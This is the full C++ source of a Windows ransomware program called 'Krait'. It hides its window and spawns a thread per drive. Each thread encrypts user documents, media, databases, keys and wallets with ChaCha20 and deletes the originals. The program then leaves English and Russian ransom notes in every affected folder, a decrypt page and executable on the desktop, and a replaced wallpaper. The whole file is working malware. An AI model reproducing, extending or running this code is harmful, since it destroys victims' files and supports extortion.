#include <windows.h>
#include <shlobj.h>
#include <filesystem>
#include <fstream>
#include <vector>
#include <string>
#include <thread>
#include <atomic>
#include <set>
#include <algorithm>
#include <sstream>
#include <iomanip>
#include <cstring>
#include <sodium.h>

namespace fs = std::filesystem;
using namespace std;

// ==================== Ключи ====================
static vector<uint8_t> SHA256(const vector<uint8_t>& data) {
    HCRYPTPROV hProv;
    HCRYPTHASH hHash;
    vector<uint8_t> hash(32);
    if (!CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) return hash;
    if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) { CryptReleaseContext(hProv, 0); return hash; }
    if (!CryptHashData(hHash, data.data(), data.size(), 0)) { CryptDestroyHash(hHash); CryptReleaseContext(hProv, 0); return hash; }
    DWORD hashLen = 32;
    CryptGetHashParam(hHash, HP_HASHVAL, hash.data(), &hashLen, 0);
    CryptDestroyHash(hHash);
    CryptReleaseContext(hProv, 0);
    return hash;
}

static string GetMachineID() {
    stringstream ss;
    DWORD serial;
    GetVolumeInformationA("C:\\", NULL, 0, &serial, NULL, NULL, NULL, 0);
    ss << hex << serial;
    SYSTEMTIME st;
    GetSystemTime(&st);
    ss << st.wYear << st.wMonth << st.wDay << st.wHour << st.wMinute;
    LARGE_INTEGER perf;
    QueryPerformanceCounter(&perf);
    ss << perf.QuadPart;
    return ss.str();
}

static vector<uint8_t> GenerateMasterKey() {
    string id = GetMachineID();
    vector<uint8_t> data(id.begin(), id.end());
    return SHA256(data);
}

static string GeneratePersonalKey(const vector<uint8_t>& masterKey) {
    stringstream ss;
    for (int i = 0; i < 16; i++) {
        ss << hex << setw(2) << setfill('0') << (int)masterKey[i];
        if (i % 4 == 3 && i < 15) ss << "-";
    }
    return ss.str();
}

static vector<uint8_t> DeriveKey(const string& personalKey) {
    string clean;
    for (char c : personalKey) if (c != '-') clean += c;
    vector<uint8_t> keyData;
    for (size_t i = 0; i < clean.length(); i += 2) {
        keyData.push_back((uint8_t)strtol(clean.substr(i, 2).c_str(), NULL, 16));
    }
    while (keyData.size() < 32) keyData.push_back(0);
    return SHA256(keyData);
}
// ==================================================

// ==================== Шифрование ====================
static atomic<bool> stopFlag = false;

vector<string> GetExtensions() {
    return {
        ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".pdf",
        ".jpg", ".jpeg", ".png", ".bmp", ".gif", ".tiff", ".psd",
        ".zip", ".rar", ".7z", ".tar", ".gz", ".bz2",
        ".mp3", ".wav", ".flac", ".aac", ".ogg",
        ".mp4", ".avi", ".mkv", ".mov", ".wmv", ".flv",
        ".txt", ".rtf", ".odt", ".ods", ".odp",
        ".db", ".sql", ".sqlite", ".mdb",
        ".pst", ".ost", ".msg", ".eml",
        ".iso", ".img", ".vhd", ".vmdk",
        ".ps1", ".bat", ".cmd", ".py", ".js", ".html", ".css",
        ".cpp", ".c", ".h", ".java", ".cs", ".php",
        ".xml", ".json", ".yml", ".yaml", ".ini", ".cfg",
        ".key", ".pem", ".crt", ".cer", ".pfx",
        ".wallet", ".dat", ".bak", ".backup"
    };
}

vector<string> GetDrives() {
    vector<string> drives;
    DWORD mask = GetLogicalDrives();
    for (int i = 0; i < 26; i++) {
        if (mask & (1 << i)) {
            string drive = string(1, 'A' + i) + ":\\";
            UINT type = GetDriveTypeA(drive.c_str());
            if (type == DRIVE_FIXED || type == DRIVE_REMOVABLE) drives.push_back(drive);
        }
    }
    return drives;
}

bool ShouldSkipPath(const string& path) {
    static const set<string> skipDirs = {
        "\\Windows\\", "\\System32\\", "\\SysWOW64\\",
        "\\Program Files\\", "\\Program Files (x86)\\",
        "\\Windows.old\\", "\\$Recycle.Bin\\",
        "\\System Volume Information\\", "\\Boot\\", "\\EFI\\", "\\Recovery\\"
    };
    string lower = path;
    transform(lower.begin(), lower.end(), lower.begin(), ::tolower);
    for (const auto& dir : skipDirs) {
        string lowerDir = dir;
        transform(lowerDir.begin(), lowerDir.end(), lowerDir.begin(), ::tolower);
        if (lower.find(lowerDir) != string::npos) return true;
    }
    return false;
}

void EncryptFile(const string& filePath, const vector<uint8_t>& key) {
    if (stopFlag) return;
    ifstream in(filePath, ios::binary);
    if (!in) return;
    in.seekg(0, ios::end);
    size_t size = in.tellg();
    if (size > 100 * 1024 * 1024 || size == 0) { in.close(); return; }
    in.seekg(0, ios::beg);
    vector<uint8_t> data(size);
    in.read((char*)data.data(), size);
    in.close();

    uint8_t nonce[crypto_stream_chacha20_NONCEBYTES];
    randombytes_buf(nonce, sizeof(nonce));

    vector<uint8_t> encrypted(size);
    crypto_stream_chacha20_xor(encrypted.data(), data.data(), size, nonce, key.data());

    string newPath = filePath + ".KraitL0ck";
    ofstream out(newPath, ios::binary);
    out.write((char*)nonce, sizeof(nonce));
    out.write((char*)encrypted.data(), encrypted.size());
    out.close();
    DeleteFileA(filePath.c_str());
}

void EncryptDirectory(const string& dir, const vector<uint8_t>& key, const string& personalKey) {
    if (stopFlag) return;
    try {
        vector<string> files;
        for (const auto& entry : fs::recursive_directory_iterator(dir)) {
            if (stopFlag) return;
            if (!entry.is_regular_file()) continue;
            string path = entry.path().string();
            if (ShouldSkipPath(path)) continue;
            string ext = fs::path(path).extension().string();
            transform(ext.begin(), ext.end(), ext.begin(), ::tolower);
            auto extensions = GetExtensions();
            if (find(extensions.begin(), extensions.end(), ext) != extensions.end()) {
                files.push_back(path);
            }
        }
        if (files.empty()) return;
        for (const auto& file : files) {
            if (stopFlag) break;
            EncryptFile(file, key);
        }
        string readme = dir + "\\READ_ME.txt";
        ofstream f(readme);
        if (f) {
            f << "ENG:\nHello. Your personal files have been encrypted by the Krait security system! To decrypt your files, you need to open the KRAIT_DECRYPT.html file located on your desktop. On that page, enter your personal key into the input field; you can find this key in the READ_ME.txt file located in each encrypted folder. After entering your personal key, click the \"decrypt\" button and enter the resulting password into the Krait window (which can be opened from your desktop via KRAIT.exe).\n";
            f << "You personal key: " << personalKey << "\n\n";
            f << "RUS:\nЗдравствуйте. Ваши личные файлы были зашифрованы системой безопасности Krait! Чтобы расшифровать файлы, откройте файл KRAIT_DECRYPT.html, расположенный на рабочем столе. На открывшейся странице введите свой персональный ключ в поле ввода; этот ключ можно найти в файле READ_ME.txt, который находится в каждой папке с зашифрованными файлами. После ввода персонального ключа нажмите кнопку «decrypt» и введите полученный пароль в окне программы Krait (его можно открыть с рабочего стола, запустив KRAIT.exe).\n";
            f << "Ваш персональный ключ: " << personalKey << "\n";
        }
    } catch (...) {}
}

void EncryptDrive(const string& drive, const vector<uint8_t>& key, const string& personalKey) {
    if (stopFlag) return;
    if (ShouldSkipPath(drive)) return;
    try {
        for (const auto& entry : fs::directory_iterator(drive)) {
            if (stopFlag) return;
            if (entry.is_directory()) {
                EncryptDirectory(entry.path().string(), key, personalKey);
            }
        }
    } catch (...) {}
}

void ExtractResource(int id, const string& path) {
    HRSRC hRes = FindResourceA(NULL, MAKEINTRESOURCEA(id), RT_RCDATA);
    if (!hRes) return;
    HGLOBAL hData = LoadResource(NULL, hRes);
    if (!hData) return;
    DWORD size = SizeofResource(NULL, hRes);
    LPVOID pData = LockResource(hData);
    ofstream out(path, ios::binary);
    out.write((char*)pData, size);
    out.close();
}

void CreateDesktopFiles(const string& personalKey) {
    char desktop[MAX_PATH];
    SHGetFolderPathA(NULL, CSIDL_DESKTOP, NULL, 0, desktop);
    string d = string(desktop);

    string html = d + "\\KRAIT_DECRYPT.html";
    ofstream h(html);
    if (h) {
        h << "<!DOCTYPE html>\n";
        h << "<html>\n<head><meta charset=\"UTF-8\"><title>Krait Decrypt</title>\n";
        h << "<style>\n";
        h << "body { background: #000; color: #fff; font-family: 'Segoe UI', Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }\n";
        h << ".container { background: #1a1a1a; padding: 40px; border-radius: 8px; border: 1px solid #333; max-width: 500px; text-align: center; }\n";
        h << "h1 { color: #ff3333; font-size: 28px; margin-top: 0; }\n";
        h << "p { color: #aaa; line-height: 1.6; font-size: 14px; }\n";
        h << "input { width: 100%; padding: 12px; background: #2a2a2a; border: 1px solid #444; color: #fff; border-radius: 4px; font-size: 16px; margin: 20px 0; box-sizing: border-box; }\n";
        h << "input:focus { outline: none; border-color: #ff3333; }\n";
        h << "button { background: #ff3333; color: #fff; border: none; padding: 14px 40px; border-radius: 4px; font-size: 16px; cursor: pointer; transition: 0.3s; }\n";
        h << "button:hover { background: #cc0000; }\n";
        h << "#result { margin-top: 20px; padding: 10px; background: #0a0a0a; border-radius: 4px; font-family: monospace; word-break: break-all; display: none; }\n";
        h << "</style>\n</head>\n<body>\n";
        h << "<div class=\"container\">\n";
        h << "<h1>KRAIT DECRYPT</h1>\n";
        h << "<p>Enter your personal key from READ_ME.txt to generate decryption password:</p>\n";
        h << "<input type=\"text\" id=\"keyInput\" placeholder=\"XXXX-XXXX-XXXX-XXXX\">\n";
        h << "<button onclick=\"decrypt()\">DECRYPT</button>\n";
        h << "<div id=\"result\"></div>\n</div>\n";
        h << "<script>\n";
        h << "function decrypt() {\n";
        h << "    var key = document.getElementById('keyInput').value.trim();\n";
        h << "    if (key.length < 16) { alert('Invalid key format'); return; }\n";
        h << "    var clean = key.replace(/-/g, '');\n";
        h << "    var bytes = [];\n";
        h << "    for (var i = 0; i < clean.length; i += 2) {\n";
        h << "        bytes.push(parseInt(clean.substr(i, 2), 16));\n";
        h << "    }\n";
        h << "    var result = '';\n";
        h << "    for (var i = bytes.length - 1; i >= 0; i--) {\n";
        h << "        var val = bytes[i] ^ 0xAA;\n";
        h << "        result += String.fromCharCode(val);\n";
        h << "    }\n";
        h << "    document.getElementById('result').style.display = 'block';\n";
        h << "    document.getElementById('result').textContent = 'Password: ' + result;\n";
        h << "}\n</script>\n</body>\n</html>\n";
    }

    string exe = d + "\\KRAIT.exe";
    ExtractResource(101, exe);
}

void SetWallpaper() {
    string path = "C:\\Windows\\Temp\\krait.webp";
    ExtractResource(102, path);
    HKEY hKey;
    RegOpenKeyExA(HKEY_CURRENT_USER, "Control Panel\\Desktop", 0, KEY_SET_VALUE, &hKey);
    RegSetValueExA(hKey, "Wallpaper", 0, REG_SZ, (BYTE*)path.c_str(), path.length() + 1);
    RegSetValueExA(hKey, "WallpaperStyle", 0, REG_SZ, (BYTE*)"2", 2);
    RegSetValueExA(hKey, "TileWallpaper", 0, REG_SZ, (BYTE*)"0", 2);
    RegCloseKey(hKey);
    SystemParametersInfoA(SPI_SETDESKWALLPAPER, 0, (void*)path.c_str(), SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);
}

int WINAPI WinMain(HINSTANCE h, HINSTANCE, LPSTR, int) {
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    if (sodium_init() < 0) return 1;

    auto masterKey = GenerateMasterKey();
    string personalKey = GeneratePersonalKey(masterKey);
    auto key = DeriveKey(personalKey);

    auto drives = GetDrives();
    vector<thread> threads;
    for (const auto& drive : drives) {
        threads.emplace_back([drive, key, personalKey]() {
            EncryptDrive(drive, key, personalKey);
        });
    }
    for (auto& t : threads) t.join();

    CreateDesktopFiles(personalKey);
    SetWallpaper();

    return 0;
}
